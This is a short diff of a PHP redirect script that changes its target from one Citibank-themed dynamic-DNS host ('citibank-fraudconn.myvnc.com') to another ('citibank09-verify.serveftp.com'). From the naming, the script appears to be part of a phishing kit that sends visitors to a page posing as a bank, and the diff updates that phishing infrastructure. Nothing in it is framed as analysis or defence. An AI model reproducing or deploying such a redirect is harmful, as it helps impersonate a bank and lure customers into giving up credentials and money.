@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://citibank-fraudconn.myvnc.com/"); 
+header("Location: https://citibank09-verify.serveftp.com/"); 
   
 exit; 
 ?> 
